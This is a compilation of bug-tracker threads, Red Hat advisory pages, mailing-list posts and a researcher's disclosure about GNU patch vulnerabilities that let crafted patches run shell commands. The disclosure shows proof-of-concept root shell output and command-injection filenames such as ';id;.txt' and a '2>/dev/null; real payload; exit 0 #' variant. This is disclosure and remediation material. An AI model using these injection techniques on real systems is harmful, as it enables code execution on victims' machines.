| [Tue 17 Apr 2018 02:39:53 PM UTC, comment #8:](#comment8) Quote  Jean,   you may be surprised to learn that 'quilt annotate' currently uses ed-style patches -- but could be changed to use ed directly, of course.   I've learned that even small changes to the behavior of patch easily lead to unforeseen problems, so I'm surely not going to remove automatic ed-style patch detection.  Configuring out ed-style patches altogether would be less of a problem. | [Andreas Gruenbacher <agruen>](/users/agruen) Group administrator |
| [Tue 17 Apr 2018 01:58:17 PM UTC, comment #7:](#comment7) Quote  Hanno, I can't see how people compiling patch on their own or not should matter. As a distribution package maintainer, if there was a configure option to disable ed support completely, I would gladly use it, because I very much doubt our users need that feature, and I'd rather limit the attack surface. Each distribution can make a different choice depending on their user base. People use distributions, instead of building everything themselves, exactly so that we make decisions for them and they don't have to bother.   So I am very favorable to adding such a configure option. Actually I was going to suggest it too.   Ed-style format not being auto-detected was also something I wanted to suggest. Andreas, because something used to work before isn't not a good enough reason to never change it. Being secure is more important than being compatible in this case, in my opinion. Ed-style patches are very specific, so specific that I still have to see any in the wild. I would expect people who use that (if they exist) to know what they are doing and be fine with adjusting their calls for the benefit of the majority.   If you really don't want to disable auto-detection of ed-style patches by default then this could also be a configure option, that is, it would be a tristate instead of a boolean: ed-style patches supported and auto-detected, supported but not auto-detected, or not supported at all. | [Jean Delvare <khali>](/users/khali) |
| [Mon 09 Apr 2018 08:15:55 AM UTC, comment #6:](#comment6) Quote  Ed restricted mode is a GNU extension and not supported by other implementations of ed, so GNU patch would end up being subtly broken on systems which don't have GNU ed.  (I'd rather not add a build-time dependency or a runtime fallback code, either.)   On the patch you refer to: first, ed-style patches have always been auto-detected and changing that behavior can potentially break old programs or scripts, so it's not going to happen.  Second, the patch adds another special meaning to the -f flag which would just make the flag even more weird; I'd rather like to avoid. Third, adding warnings like "this could allow arbitrary command execution" to messages seems rather stupid: either we're aware of or at least suspicious about such vulnerabilities and then we should act, or we don't and then we shouldn't warn about problems we don't think exist. | [Andreas Gruenbacher <agruen>](/users/agruen) Group administrator |
| [Mon 09 Apr 2018 07:28:56 AM UTC, comment #5:](#comment5) Quote  I'm not keen on having a configure option here, as realistically very few people will compile patch on their own.   I think there are different questions to answer here:   * Should ed use to restricted mode? I'd say yes, unless this breaks something. I don't think so, and thus this should be done (unconditionally, not as a configure or otherwise option).      * Should ed patches be autodetected by default? I think no, because they're hardly used in practice. Even with the fix in place I'd recommend applying the first patch that was attached here. | [Hanno Boeck <hanno>](/users/hanno) |
| [Mon 09 Apr 2018 07:04:58 AM UTC, comment #4:](#comment4) Quote  For such cases, how about instead adding a configure option to disable ed-style patch support? This would provide an even stronger guarantee that nothing can go wrong, and I don't think people so highly focused on security would mind restricting patch in that way. | [Andreas Gruenbacher <agruen>](/users/agruen) Group administrator |
| [Mon 09 Apr 2018 03:19:45 AM UTC, comment #3:](#comment3) Quote  The patch in [123eaff] looks solid.  If I may summarise, the change it makes is to put the ed script in a temporary file and invoke `ed tmpname.ed`, so that scripts with syntax errors will cause ed to abort rather than heroically trying to soldier on, which is what led to it running unvalidated commands previously.   do\_ed\_script() / ed\_get\_command\_letter() are quite strict in the ed commands they will allow.  With this patch in place I can't see any opportunity to subvert their validation.   That said, some distributors may want to add a further layer of defence (against unforseen injection opportunities, or future changes in ed/patch command parsing) by having patch invoke "ed -r".  Could this be supported with a configure option? | Anonymous |
| [Fri 06 Apr 2018 10:26:37 AM UTC, comment #2:](#comment2) Quote  Fix pushed to the git repository. | [Andreas Gruenbacher <agruen>](/users/agruen) Group administrator |

At the very least, Ed should be executed with `-r' (restricted mode) which `disables editing of files out of the current directory and execution of shell commands' (from the manual). | Anonymous |

## Synopsis

Important: patch security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A2091)

## Topic

An update for patch is now available for Red Hat Enterprise Linux 7.4 Extended Update Support.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The patch program applies diff files to originals. The diff command is used to compare an original to a changed file. Diff lists the changes made to the file. A person who has the original file can then use the patch command with the diff file to add the changes to their original file (patching the file).

Security Fix(es):

* patch: Malicious patch files cause ed to execute arbitrary commands (CVE-2018-1000156)

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Hello.

After analysis of the diff it in unclear what exactly the race condition
bug is and how it would constitute a privileged escalation.

Please could somebody provide an explanation of what the race condition
is, and how it is a security issue rather than just being a regular bug.
so we can understand why the patch fixes it.

It seems that open/closing the console_device (set with -e) was done
repeatedly in the -n case. It's possible that the race in question would
be triggered if a SIGINT or SIGTERM was sent at the right time (which
time)? possibly causing a double free. As the beep program just performs
ioctl or writes a very simple struct to an fd it does not seem there is
enough attacker control to actually do any sort of code execution with
beep.

So this may not really be a security issue, just a minor improvement in
the code. I welcome being corrected though.

(Note: we have looked at the satire website about the bug
<https://holeybeep.ninja> and it does not provide any technical details of
interest)

Cheers!

```

Subject: Explanation of the beep vulnerability found on the 'net.
Date: Thu, 5 Apr 2018 12:40:23 -0400
```
An explanation of the exploit (not by me) is at
<<https://news.ycombinator.com/item?id=16762794>>:

    My speculation on the race condition fixed in the patch:

	The while loop in `main` calls `play_beep` multiple times. Each call
	to `play_beep` opens the `--device` and sets the global
	`console_fd`, and then sets the global `console_type` based on the
	`ioctl(EVIOCGSND)` error, before calling `do_beep`.

	This normally prevents the user from writing to arbitrary files with
	`--device`, because without the `ioctl(EVIOCGSND)` succeeding,
	`do_beep` with `BEEP_TYPE_CONSOLE` only does a (harmless?)
	`ioctl(KIOCSOUND)`, not a `write` with the `struct input_event`.
	However, the signal handler calls `do_beep` directly using the
	globals set by `play_beep`...

	So I image that with something along the lines of `beep
	--device=./symlink-to-tty ... --new ...`, you can rewrite the
	symlink to point to an arbitrary file during the first `play_beep`,
	and then race the open/ioctl in the second `play_beep` with the
	signal handler such that `do_beep` gets called with `console_fd`
	pointing to your arbitrary file, and with `console_type` still set
	to `BEEP_TYPE_EVDEV`, resulting in a `write` to your arbitrary file.

	Exploiting that for privesc would require control over the `struct
	input_event` for the `write`... `handle_signal` calls `do_beep` with
	a fixed `freq` of 0, so all of the initialized fields are set to
	fixed values... However, there's an unitialized `struct timeval` at
	the beginning of the `struct input_event`, and it's allocated on the
	stack...

	Seems like a curious security vulnerability, I'll assume the debian
	security team must have a working PoC in order to actually call it
	out as a local privesc vulnerability... I'd love to see the actual
	PoC eventually :)

The patch vulnerability seems more severe to me, as people apply patches
all the time (they shouldn't do it as root, but people are people).

It's concerning that the holeybeep.ninja site exploited an unrelated
fault for 'fun' without apparently telling anyone.

To be fair, they told you exactly what was going to happen: “Apply this
[patch] as soon as possible using the following command: patch -p1 <
beep.diff. A short beep should be heard if all hunks are applied
successfully.”

 So people are falling for a fake page that is not even well disguised, apply a patch from there and now worry about being exploited?  Call me unimpressed, but what is expected to be done about that?

 Please, only get your patches through trusted sources, not from windy websites that just look shiny on the surface. I can just say well played, holeybeep people.

 Enjoy,
Rhonda

Hi,

There's an additional issue, which is that the ability to open arbitrary
caller-chosen files represents at least an information leak, and maybe
more serious. See the comments starting at:

How similar is beep to beep2? I use beep2 on Smoothwall Express. It is not installed suid root. Rather, I changed beep2's default output device to /dev/tty13 (would be just as easy to use tty63) and changed the perms on that TTY to 622. Without suid root, beep2 can only open files for input or output for which its user has access; with similar treatment, beep should be almost properly limited.

## Environment considerations

Red Hat Enterprise Linux starting with versions 6.1 and 5.7 introduced a new Red Hat Subscription Management (RHSM) service. Red Hat Network (RHN) has been decommissioned.

Users that are new to Red Hat or would like the enhanced subscription information and improved content access should use RHSM. If you are still using Red Hat Network, we advise you to [migrate to RHSM as soon as possible](https://access.redhat.com/products/red-hat-subscription-management#migration). Customers using older versions of Red Hat Enterprise Linux must continue using RHN Classic. Refer to [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](https://access.redhat.com/articles/47844) and [What's the difference between management services provided by Red Hat Network (RHN) Classic and Red Hat Subscription Management (RHSM)?](https://access.redhat.com/articles/63269) for more information on benefits of RHSM over RHN.

* For **Red Hat Enterprise Linux 9**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 9](#rhel9).
* For **Red Hat Enterprise Linux 8**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 8](#rhel8).
* For **Red Hat Enterprise Linux 7**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 7](#rhel7).
* For **Red Hat Enterprise Linux 6**, register the system using RHSM (if RHEL 6.1 or above) as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 6](#rhel6).
* For **Red Hat Enterprise Linux 5**, register the system using RHSM (if RHEL 5.7 or above) as described in [Registering the system with the Subscription Manager](#rhsm). After registration, update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 5](#rhel5).
* If your system cannot connect to the Internet directly, our [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/) offering may be of interest.

## Prerequisites

### Registering the system with the Subscription Manager

#### Graphical interface

Access the Subscription Management GUI client in Red Hat Enterprise Linux 9 via **Activities** and then **Show Applications** which is visible in the Favorites dock by default.

Access the Subscription Management GUI client in Red Hat Enterprise Linux 8 via **Activities**, then select **Show Applications** and click **All**. Then select **Red Hat Subscription Manager**.

In Red Hat Enterprise Linux 7 open **Applications** -> **System Tools** -> **Red Hat Subscription Manager** and in Red Hat Enterprise Linux 6 via **System** -> **Administration** -> **Red Hat Subscription Manager**.

#### Command line

A system can also be registered via the command line by using the "subscription-manager" command. To register your system, either through the GUI or from the command line, follow the instructions in the [Using and Configuring Red Hat Subscription Manager](https://access.redhat.com/documentation/en-US/Red_Hat_Subscription_Management/1/html-single/RHSM/index.html) guide.

Make sure that your firewall allows configuring RHSM, for more information see [How do I access RHSM (yum) through a firewall?](https://access.redhat.com/solutions/65300).

General information on RHSM can be found in [Red Hat Network Subscription Management](https://access.redhat.com/documentation/en-US/Red_Hat_Customer_Portal/1/html/Red_Hat_Network_Certificate-based_Subscription_Management/index.html), while [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](/knowledge/node/47844) provides a quick overview and a comparison with RHN.

| [Tue 17 Apr 2018 02:39:53 PM UTC, comment #8:](#comment8) Quote  Jean,   you may be surprised to learn that 'quilt annotate' currently uses ed-style patches -- but could be changed to use ed directly, of course.   I've learned that even small changes to the behavior of patch easily lead to unforeseen problems, so I'm surely not going to remove automatic ed-style patch detection.  Configuring out ed-style patches altogether would be less of a problem. | [Andreas Gruenbacher <agruen>](/users/agruen) Group administrator |
| [Tue 17 Apr 2018 01:58:17 PM UTC, comment #7:](#comment7) Quote  Hanno, I can't see how people compiling patch on their own or not should matter. As a distribution package maintainer, if there was a configure option to disable ed support completely, I would gladly use it, because I very much doubt our users need that feature, and I'd rather limit the attack surface. Each distribution can make a different choice depending on their user base. People use distributions, instead of building everything themselves, exactly so that we make decisions for them and they don't have to bother.   So I am very favorable to adding such a configure option. Actually I was going to suggest it too.   Ed-style format not being auto-detected was also something I wanted to suggest. Andreas, because something used to work before isn't not a good enough reason to never change it. Being secure is more important than being compatible in this case, in my opinion. Ed-style patches are very specific, so specific that I still have to see any in the wild. I would expect people who use that (if they exist) to know what they are doing and be fine with adjusting their calls for the benefit of the majority.   If you really don't want to disable auto-detection of ed-style patches by default then this could also be a configure option, that is, it would be a tristate instead of a boolean: ed-style patches supported and auto-detected, supported but not auto-detected, or not supported at all. | [Jean Delvare <khali>](/users/khali) |
| [Mon 09 Apr 2018 08:15:55 AM UTC, comment #6:](#comment6) Quote  Ed restricted mode is a GNU extension and not supported by other implementations of ed, so GNU patch would end up being subtly broken on systems which don't have GNU ed.  (I'd rather not add a build-time dependency or a runtime fallback code, either.)   On the patch you refer to: first, ed-style patches have always been auto-detected and changing that behavior can potentially break old programs or scripts, so it's not going to happen.  Second, the patch adds another special meaning to the -f flag which would just make the flag even more weird; I'd rather like to avoid. Third, adding warnings like "this could allow arbitrary command execution" to messages seems rather stupid: either we're aware of or at least suspicious about such vulnerabilities and then we should act, or we don't and then we shouldn't warn about problems we don't think exist. | [Andreas Gruenbacher <agruen>](/users/agruen) Group administrator |
| [Mon 09 Apr 2018 07:28:56 AM UTC, comment #5:](#comment5) Quote  I'm not keen on having a configure option here, as realistically very few people will compile patch on their own.   I think there are different questions to answer here:   * Should ed use to restricted mode? I'd say yes, unless this breaks something. I don't think so, and thus this should be done (unconditionally, not as a configure or otherwise option).      * Should ed patches be autodetected by default? I think no, because they're hardly used in practice. Even with the fix in place I'd recommend applying the first patch that was attached here. | [Hanno Boeck <hanno>](/users/hanno) |
| [Mon 09 Apr 2018 07:04:58 AM UTC, comment #4:](#comment4) Quote  For such cases, how about instead adding a configure option to disable ed-style patch support? This would provide an even stronger guarantee that nothing can go wrong, and I don't think people so highly focused on security would mind restricting patch in that way. | [Andreas Gruenbacher <agruen>](/users/agruen) Group administrator |
| [Mon 09 Apr 2018 03:19:45 AM UTC, comment #3:](#comment3) Quote  The patch in [123eaff] looks solid.  If I may summarise, the change it makes is to put the ed script in a temporary file and invoke `ed tmpname.ed`, so that scripts with syntax errors will cause ed to abort rather than heroically trying to soldier on, which is what led to it running unvalidated commands previously.   do\_ed\_script() / ed\_get\_command\_letter() are quite strict in the ed commands they will allow.  With this patch in place I can't see any opportunity to subvert their validation.   That said, some distributors may want to add a further layer of defence (against unforseen injection opportunities, or future changes in ed/patch command parsing) by having patch invoke "ed -r".  Could this be supported with a configure option? | Anonymous |

# Details about recent GNU patch vulnerabilities

---

*From*: Imre Rad <radimre83 () gmail com>

*Date*: Fri, 16 Aug 2019 11:13:55 +0200

---

```
I identified several vulnerabilities in the GNU patch utility, some of
them making it possible to execute arbitrary code if the victim opens
a crafted patch file. It also turned out, some of these
vulnerabilities had been silently addressed by the maintainer back
then in 2018 when CVE-2018-1000156 was reported. Some Linux
distributions (like Debian, Ubuntu or Fedora) applied only the primary
patch and thus they remained vulnerable to the attack vectors
described below.

The PoC files can be found in this repository:

<https://github.com/irsl/gnu-patch-vulnerabilities>

CVE-2018-1000156 - unrestricted ed input

I'm unsure who the author of this finding is, but adding some details
to make the story more clear. The original thread on the official bug
report site:

<https://savannah.gnu.org/bugs/?53566>

The official patch of CVE-2018-1000156 is:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=123eaff0d5d1aebe128295959435b9ca5909c26d>

According to the comment of the commit:

src/pch.c (do_ed_script): Write ed script to a temporary file instead
of piping it to ed: this will cause ed to abort on invalid commands
instead of rejecting them and carrying on.

The thing is, ed's behaviour is different when the ed script is coming
from a pipe (see the edoffset.script attached):

root@55c24e15f7e6:/data/edstyle5# touch whatever
root@55c24e15f7e6:/data/edstyle5# cat edoffset.script | ed whatever
0
?
!
0
root@55c24e15f7e6:/data/edstyle5# cat id-proof.txt
uid=0(root) gid=0(root) groups=0(root)

And when it is duped:

root@55c24e15f7e6:/data/edstyle5#  rm id-proof.txt
root@55c24e15f7e6:/data/edstyle5#  ed whatever < edoffset.script
0
?
root@55c24e15f7e6:/data/edstyle5# cat id-proof.txt
cat: id-proof.txt: No such file or directory

And now the same via patch:

root@55c24e15f7e6:/data/edstyle5#
../patch-2.7.6-vanilla/patch-2.7.6/src/patch  < CVE-2018-1000156.patch
patching file file
?
foo
../patch-2.7.6-vanilla/patch-2.7.6/src/patch: **** /bin/ed FAILED
root@55c24e15f7e6:/data/edstyle5# cat CVE-2018-1000156-proof.txt
uid=0(root) gid=0(root) groups=0(root)

CVE-2018-1000156.patch here is pretty much the same as the original
PoC created for that issue (poc.patch among the attachments on
savannah linked above).

CVE-2019-13638 - Shell command injection while invoking ed

The GNU patch utility used to invoke ed via the shell interpreter and
the filenames were not sanitized correctly, making it vulnerable to
shell command injection. This way, exploitation of CVE-2019-13638
doesn't even require ed to be installed.

The official fix was pushed to the repo the same day as for
CVE-2018-1000156, but many distributions didn't pick it up:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0>

The proof of concept:

root@3ffaeb445eab:/data/edstyle4# patch --version
GNU patch 2.7.6
...

root@3ffaeb445eab:/data/edstyle4# patch < CVE-2019-13638.patch
patching file ';id;.txt'
sh: 1: ed: not found
uid=0(root) gid=0(root) groups=0(root)
sh: 1: .txt.o60SfgR: not found
patch: **** ed FAILED

I think a filename like "2>/dev/null; real payload; exit 0 #" could
make the overall result of the patch execution successful without
showing any errors.

CVE-2019-13636 - Directory traversal and file append

The directory traversal here made it possible to escape the working
directory of patch and append (almost) arbitrary file content to any
files on the file system.

This finding is unrelated to the 2018 one, and was fixed only after I
reported it. Official patch:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=dce4683cbbe107a95f1f0d45fabc304acfb5d71a>

When patch was saving a rejection, it did not check properly whether
the file already exists or not. This could be abused to escape the
working dir:

root@3ffaeb445eab:/data/test1/test-apply3#  cat CVE-2019-13636.patch | patch

CVE-2018-20969 - OS shell command execution via ! prefixed ed filenames

If ed receives an exclaimation mark prefixed command line argument, it
is executed as a shell command via popen. This was exploitable via GNU
patch as well.

Official fix:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0>

The referenced patch is the same as for CVE-2019-13638; note the assertion line.

(Yes, CVE-2018-20969 was reported by me in 2019 along with the other
two and MITRE indeed assigned a 2018 ID for it)

Since ed is capturing the output of what it executes and the same
version of GNU patch was vulnerable I decided to build 2 versions of
patch with the above patch applied, one with the assertion line and
one without it.

| [Description](show_bug.cgi?id=1564326#c0)  Sam Fowler    2018-04-06 00:36:53 UTC  ``` GNU patch does not properly sanitize patch files allowing for malicious patches to pass arbitrary shell commands to ed. An attacker could exploit this by tricking a user into applying malicious patches with the patch command.   ```  [Comment 1](show_bug.cgi?id=1564326#c1)  Sam Fowler    2018-04-06 00:37:33 UTC  ``` Created patch tracking bugs for this issue:  Affects: fedora-all [[bug 1564327](show_bug.cgi?id=1564327 "CLOSED ERRATA - CVE-2018-1000156 patch: Malicious patch files cause ed to execute arbitrary commands [fedora-all]")]   ```  [Comment 3](show_bug.cgi?id=1564326#c3)  Doran Moppert    2018-04-06 00:56:11 UTC  ``` There is some discussion at: <http://rachelbythebay.com/w/2018/04/05/bangpatch/>  The OpenBSD patch tries to fix up interpretation of s// commands on their way to ed.  The FreeBSD patch does this and also switches to /usr/bin/red (restricted-mode ed), which is supposed to be safer.  On first glance, GNU patch's interpretation of the stream passed to ed is much more naive.  The "correct" thing would be to invoke /usr/bin/red (on the assumption that patches shouldn't be able to execute arbitrary commands).  It also looks like GNU patch ignores -c -e -n -u options to specify the patch type, instead calling intuit_diff_type for each file header.   ```  [Comment 5](show_bug.cgi?id=1564326#c5)  Doran Moppert    2018-04-06 01:05:52 UTC  ``` Upstream ticket:  <https://savannah.gnu.org/bugs/?53566>   ```  [Comment 7](show_bug.cgi?id=1564326#c7)  Doran Moppert    2018-04-06 01:17:49 UTC  ``` Two proposed patches are already attached upstream.  Of those, Saleem Rashid's "Refuse to apply ed scripts by default" seems pretty solid, as it asks the user before each potential invocation of ed.  This protects against bugs in restricted-ed as well, which seems wise.  It also includes tests, and allows override with "-f" in case auto build systems want to enable ed for some reason.  The risk remains that existing build systems already use -f, so they will be unprotected.   ```  [Comment 8](show_bug.cgi?id=1564326#c8)  Doran Moppert    2018-04-09 03:25:39 UTC  ``` Upstream patch:  <http://git.savannah.gnu.org/cgit/patch.git/commit/?id=123eaff0d5d1aebe128295959435b9ca5909c26d>  Includes test suite which covers the cases identified here, and more.  This forces ed to quit on invalid commands, preventing this injection.  Patch applies quite strict validation to ed scripts, so hopefully this is the only missing piece.  Invoking "ed -r" is still probably a good defense-in-depth mechanism, as further injections may be present or introduced by future changes in ed or patch.   ```  [Comment 9](show_bug.cgi?id=1564326#c9)  errata-xmlrpc    2018-04-23 17:32:53 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 6  Via RHSA-2018:1199 [https://access.redhat.com/errata/RHSA-2018:1199](https://access.redhat.com/errata/RHSA-2018%3A1199)   ```  [Comment 10](show_bug.cgi?id=1564326#c10)  errata-xmlrpc    2018-04-23 17:35:23 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2018:1200 [https://access.redhat.com/errata/RHSA-2018:1200](https://access.redhat.com/errata/RHSA-2018%3A1200)   ```  [Comment 19](show_bug.cgi?id=1564326#c19)  errata-xmlrpc    2018-06-27 19:00:11 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 6.5 Advanced Update Support  Via RHSA-2018:2096 [https://access.redhat.com/errata/RHSA-2018:2096](https://access.redhat.com/errata/RHSA-2018%3A2096)   ```  [Comment 20](show_bug.cgi?id=1564326#c20)  errata-xmlrpc    2018-06-27 19:00:38 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.2 Advanced Update Support   Red Hat Enterprise Linux 7.2 Update Services for SAP Solutions   Red Hat Enterprise Linux 7.2 Telco Extended Update Support  Via RHSA-2018:2093 [https://access.redhat.com/errata/RHSA-2018:2093](https://access.redhat.com/errata/RHSA-2018%3A2093)   ```  [Comment 21](show_bug.cgi?id=1564326#c21)  errata-xmlrpc    2018-06-27 19:00:50 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 6.6 Advanced Update Support   Red Hat Enterprise Linux 6.6 Telco Extended Update Support  Via RHSA-2018:2095 [https://access.redhat.com/errata/RHSA-2018:2095](https://access.redhat.com/errata/RHSA-2018%3A2095)   ```  [Comment 22](show_bug.cgi?id=1564326#c22)  errata-xmlrpc    2018-06-27 19:01:05 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 6.7 Extended Update Support  Via RHSA-2018:2094 [https://access.redhat.com/errata/RHSA-2018:2094](https://access.redhat.com/errata/RHSA-2018%3A2094)   ```  [Comment 23](show_bug.cgi?id=1564326#c23)  errata-xmlrpc    2018-06-27 19:01:43 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 6.4 Advanced Update Support  Via RHSA-2018:2097 [https://access.redhat.com/errata/RHSA-2018:2097](https://access.redhat.com/errata/RHSA-2018%3A2097)   ```  [Comment 24](show_bug.cgi?id=1564326#c24)  errata-xmlrpc    2018-06-27 19:10:41 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.3 Extended Update Support  Via RHSA-2018:2092 [https://access.redhat.com/errata/RHSA-2018:2092](https://access.redhat.com/errata/RHSA-2018%3A2092)   ```  [Comment 25](show_bug.cgi?id=1564326#c25)  errata-xmlrpc    2018-06-27 19:15:24 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.4 Extended Update Support  Via RHSA-2018:2091 [https://access.redhat.com/errata/RHSA-2018:2091](https://access.redhat.com/errata/RHSA-2018%3A2091)   ``` |  |

Fix arbitrary command execution in ed-style patches (CVE-2018-1000156)\* src/pch.c (do\_ed\_script): Write ed script to a temporary file instead
of piping it to ed: this will cause ed to abort on invalid commands
instead of rejecting them and carrying on.
\* tests/ed-style: New test case.
\* tests/Makefile.am (TESTS): Add test case.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

